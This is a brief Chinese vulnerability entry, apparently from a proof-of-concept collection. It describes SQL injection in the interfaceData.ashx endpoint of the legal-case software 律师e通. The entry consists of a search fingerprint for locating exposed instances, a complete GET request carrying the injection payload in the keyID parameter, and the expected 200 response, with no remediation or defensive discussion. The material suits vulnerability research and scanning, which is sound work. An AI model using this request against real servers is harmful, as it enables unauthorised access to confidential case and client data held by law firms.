# 律师e通interfaceData存在SQL注入漏洞

律师e通 ｜ SQL注入 ｜ —
- **指纹**：`title=="律师e通"`
- **请求**：`GET /caseprocess/jsonData/interfaceData.ashx?param=loadCaseInfo&keyID='+or+1=user-- HTTP/1.1`
- **响应特征**：200